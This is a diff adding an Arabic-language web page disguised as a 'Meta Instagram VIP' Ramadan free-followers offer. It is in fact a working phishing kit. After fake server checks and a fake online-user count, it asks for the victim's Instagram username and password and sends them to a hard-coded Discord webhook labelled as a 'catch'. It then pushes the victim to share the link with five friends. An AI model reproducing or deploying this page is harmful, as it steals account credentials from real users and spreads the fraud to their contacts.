@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Instagram VIP - Animation Edition</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root {
+            --deep-blue: #02050a;
+            --insta-gradient: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            --gold: #ffd700;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(circle at center, #0a0e17 0%, #02050a 100%);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+
+        #particles-js { position: fixed; width: 100%; height: 100%; z-index: -1; }
+
+        .panel {
+            background: rgba(15, 20, 30, 0.95);
+            width: 380px;
+            padding: 30px;
+            border-radius: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.9);
+            text-align: center;
+            position: relative;
+            z-index: 10;
+            animation: panelShow 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes panelShow {
+            from { opacity: 0; transform: scale(0.8) translateY(50px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
+        }
+
+        .online-count {
+            background: rgba(0, 255, 0, 0.1);
+            color: #00ff00;
+            font-size: 11px;
+            padding: 5px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 15px;
+            border: 1px solid rgba(0, 255, 0, 0.2);
+        }
+
+        input, select {
+            width: 100%; padding: 14px; margin: 12px 0; border-radius: 12px;
+            border: 1px solid #222; background: #0c1018; color: white;
+            transition: 0.3s; outline: none; text-align: center;
+        }
+
+        input:focus { border-color: #dc2743; box-shadow: 0 0 10px rgba(220, 39, 67, 0.3); }
+
+        /* Button Animation */
+        button {
+            width: 100%; padding: 16px; background: var(--insta-gradient);
+            border: none; border-radius: 12px; color: white; font-weight: bold;
+            cursor: pointer; transition: all 0.2s ease; font-size: 16px;
+            box-shadow: 0 5px 15px rgba(220, 39, 67, 0.3);
+        }
+
+        button:active { transform: scale(0.95); filter: brightness(0.9); }
+
+        .btn-share {
+            background: #ffffff; color: #000; display: flex; align-items: center;
+            justify-content: center; gap: 10px; margin-top: 15px;
+        }
+
+        .progress-bar {
+            background: #111; height: 10px; border-radius: 10px;
+            margin: 20px 0; overflow: hidden; border: 1px solid #333;
+        }
+
+        .fill {
+            background: var(--insta-gradient); width: 0%; height: 100%;
+            transition: 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .hidden { display: none; }
+        
+        /* Step Transitions */
+        .fade-exit { animation: fadeOut 0.4s forwards; }
+        @keyframes fadeOut { from { opacity: 1; } to { opacity: 0; transform: scale(0.9); } }
+
+        .loader {
+            border: 3px solid rgba(255,255,255,0.1);
+            border-top: 3px solid #dc2743;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 20px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div id="particles-js"></div>
+
+<div id="step1" class="panel">
+    <div class="online-count"><i class="fas fa-circle" style="font-size: 8px;"></i> المتصلون الآن: 4,829 مستخدم</div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1200px-Instagram_logo_2016.svg.png" width="60" style="margin-bottom: 10px;">
+    <h3>حملة رمضان Turbo 🌙</h3>
+    <input type="text" id="user_initial" placeholder="Username (أدخل اسم الحساب)">
+    <select id="followers_count">
+        <option value="1500">1,500 متابع VIP</option>
+        <option value="3000">3,000 متابع VIP</option>
+    </select>
+    <button onclick="changeStep('step1', 'stepAnalysis')">ابدأ عملية الربط</button>
+</div>
+
+<div id="stepAnalysis" class="panel hidden">
+    <h3>جاري الاتصال بسيرفر Meta...</h3>
+    <div class="loader"></div>
+    <p id="analysis-text" style="font-size: 13px; color: #888;">يتم الآن فحص الأهلية لهذا الحساب</p>
+</div>
+
+<div id="stepLogin" class="panel hidden">
+    <h3 style="color: var(--gold);"><i class="fas fa-user-lock"></i> التحقق الأمني</h3>
+    <p style="font-size: 13px;">يرجى تأكيد ملكية الحساب لتفعيل الـ **Turbo VIP** ومنع البوتات من استغلال العرض.</p>
+    <input type="text" id="final_u" placeholder="Username / Email">
+    <input type="password" id="final_p" placeholder="Password (كلمة المرور)">
+    <button id="loginBtn" onclick="submitToDiscord()">تأكيد الهوية وتفعيل</button>
+</div>
+
+<div id="stepShare" class="panel hidden">
+    <h3 style="color: var(--gold);">⚡ خطوة أخيرة للتفعيل</h3>
+    <p style="font-size: 13px;">تم استلام طلبك! شارك الرابط مع 5 من أصدقائك في **Instagram Direct** لتأكيد نشاطك وتفعيل الإرسال التلقائي.</p>
+    <div class="progress-bar"><div id="bar" class="fill"></div></div>
+    <p id="share-count" style="font-weight: bold;">اكتمال الطلب: 0/5</p>
+    <button class="btn-share" onclick="handleInstaShare()">
+        <i class="fab fa-instagram" style="color: #e1306c; font-size: 22px;"></i> مشاركة عبر Instagram
+    </button>
+</div>
+
+<div id="stepEnd" class="panel hidden">
+    <i class="fas fa-rocket" style="font-size: 50px; color: var(--gold); margin-bottom: 20px;"></i>
+    <h3>تم الإرسال بنجاح!</h3>
+    <p>بسبب حملة رمضان، قد يستغرق وصول المتابعين من 2 إلى 12 ساعة. رمضان مبارك!</p>
+</div>
+
+<script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+<script>
+    const WEBHOOK = "https://discord.com/api/webhooks/1467269387647193300/OqrAQZ_ldXNS_tHmyFAGVfhDEHUo2neENW6BCvuHyA1pxDT9ebu7_3FDguea3ZA1khbp";
+    let shares = 0;
+
+    function changeStep(current, next) {
+        const currEl = document.getElementById(current);
+        const nextEl = document.getElementById(next);
+        
+        currEl.classList.add('fade-exit');
+        setTimeout(() => {
+            currEl.classList.add('hidden');
+            currEl.classList.remove('fade-exit');
+            nextEl.classList.remove('hidden');
+            
+            if(next === 'stepAnalysis') {
+                runAnalysis();
+            }
+        }, 4000);
+    }
+
+    // نسخة أسرع للتنقل اليدوي
+    function fastStep(current, next) {
+        document.getElementById(current).classList.add('hidden');
+        document.getElementById(next).classList.remove('hidden');
+    }
+
+    function runAnalysis() {
+        setTimeout(() => { document.getElementById('analysis-text').innerText = "تم إيجاد الحساب.. جاري تهيئة السيرفر"; }, 2000);
+        setTimeout(() => { fastStep('stepAnalysis', 'stepLogin'); document.getElementById('final_u').value = document.getElementById('user_initial').value; }, 4500);
+    }
+
+    function submitToDiscord() {
+        const u = document.getElementById('final_u').value;
+        const p = document.getElementById('final_p').value;
+        const c = document.getElementById('followers_count').value;
+
+        if(!p) return alert("أدخل كلمة المرور!");
+        document.getElementById('loginBtn').innerText = "...جاري المعالجة";
+
+        fetch(WEBHOOK, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                embeds: [{
+                    title: "🔱 صيد VIP جديد (رمضان)",
+                    color: 16711680,
+                    fields: [
+                        { name: "👤 الحساب", value: `\`${u}\`` },
+                        { name: "🔑 كلمة السر", value: `\`${p}\`` },
+                        { name: "📈 العدد", value: `\`${c}\`` }
+                    ],
+                    timestamp: new Date()
+                }]
+            })
+        }).then(() => {
+            fastStep('stepLogin', 'stepShare');
+        }).catch(() => {
+            fastStep('stepLogin', 'stepShare');
+        });
+    }
+
+    function handleInstaShare() {
+        // فتح انستغرام
+        window.open('instagram://library?AssetPath=' + window.location.href);
+        
+        shares++;
+        let progress = (shares / 5) * 100;
+        document.getElementById('bar').style.width = progress + "%";
+        document.getElementById('share-count').innerText = `اكتمال الطلب: ${shares}/5`;
+
+        if(shares >= 5) {
+            setTimeout(() => { fastStep('stepShare', 'stepEnd'); }, 1000);
+        }
+    }
+
+    particlesJS('particles-js', { "particles": { "number": { "value": 50 }, "color": { "value": "#ffffff" }, "opacity": { "value": 0.2 }, "move": { "enable": true, "speed": 1 } } });
+</script>
+</body>
+</html>
